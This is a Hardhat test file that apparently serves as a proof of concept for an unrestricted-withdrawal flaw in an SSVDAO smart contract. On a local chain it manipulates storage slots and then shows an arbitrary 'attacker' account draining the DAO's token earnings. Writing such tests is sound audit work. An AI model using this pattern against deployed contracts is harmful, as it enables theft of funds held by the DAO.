import { ethers } from "hardhat";
import { expect } from "chai";
import { keccak256, toUtf8Bytes, zeroPadValue, toBeHex } from "ethers";

function storageSlot(label: string, offset: bigint): string {
  const base = BigInt(keccak256(toUtf8Bytes(label)));
  const slot = base - 1n + offset;
  return zeroPadValue(toBeHex(slot), 32);
}

describe("SSVDAO unrestricted withdrawal", function () {
  it("allows anyone to withdraw DAO earnings", async function () {
    const [attacker] = await ethers.getSigners();
    const Token = await ethers.getContractFactory("SSVToken");
    const token = await Token.deploy();
    await token.waitForDeployment();
    const Dao = await ethers.getContractFactory("SSVDAO");
    const dao = await Dao.deploy();
    await dao.waitForDeployment();

    const amount = ethers.parseEther("1");

    const daoAddress = await dao.getAddress();
    const tokenAddress = await token.getAddress();

    const tokenSlot = storageSlot("ssv.network.storage.main", 7n);
    await ethers.provider.send("hardhat_setStorageAt", [
      daoAddress,
      tokenSlot,
      zeroPadValue(tokenAddress, 32),
    ]);

    const daoBalanceSlot = storageSlot("ssv.network.storage.protocol", 1n);
    const shrunk = amount / 10_000_000n;
    await ethers.provider.send("hardhat_setStorageAt", [
      daoAddress,
      daoBalanceSlot,
      zeroPadValue(toBeHex(shrunk), 32),
    ]);

    await token.transfer(daoAddress, amount);
    const before = await token.balanceOf(attacker.address);

    await expect(dao.connect(attacker).withdrawNetworkEarnings(amount))
      .to.emit(dao, "NetworkEarningsWithdrawn")
      .withArgs(amount, attacker.address);

    const after = await token.balanceOf(attacker.address);
    expect(after - before).to.equal(amount);
  });
});
